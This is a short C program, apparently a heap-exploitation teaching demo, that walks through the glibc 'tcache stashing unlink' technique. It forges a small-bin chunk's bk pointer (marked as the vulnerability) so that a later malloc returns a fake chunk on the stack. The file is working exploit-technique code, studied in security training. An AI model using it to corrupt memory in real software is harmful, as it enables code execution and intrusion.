#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;

    setbuf(stdout, NULL);

    //fake chunk's bk need to be a writable addr
	//stack_var[0] -> presize
	//stack_var[1] -> size
	//stack_var[2] -> fd
	//stack-var[3] -> bk
    stack_var[3] = (unsigned long)(&stack_var[2]);

    //now we malloc 9 chunks
    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }

    //put 7 chunks into tcache
    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }

    //last tcache bin
    free(chunk_lis[1]);
    //now they are put into unsorted bin
    free(chunk_lis[0]);
    free(chunk_lis[2]);

    //convert into small bin
    malloc(0xa0);// size > 0x90

    //now 5 tcache bins
    malloc(0x90);
    malloc(0x90);

    //change victim->bck
    /*VULNERABILITY*/
    chunk_lis[2][1] = (unsigned long)stack_var;
    /*VULNERABILITY*/

    //trigger the attack
	//get from smallbin,and convert left chunks to tcache
	//then fake chunk is tcache head
    calloc(1,0x90);

    //malloc and return our fake chunk on stack
    target = malloc(0x90);   

    printf("As you can see, next malloc(0x90) will return the region our fake chunk: %p\n",(void*)target);

    assert(target == &stack_var[2]);
    return 0;
}
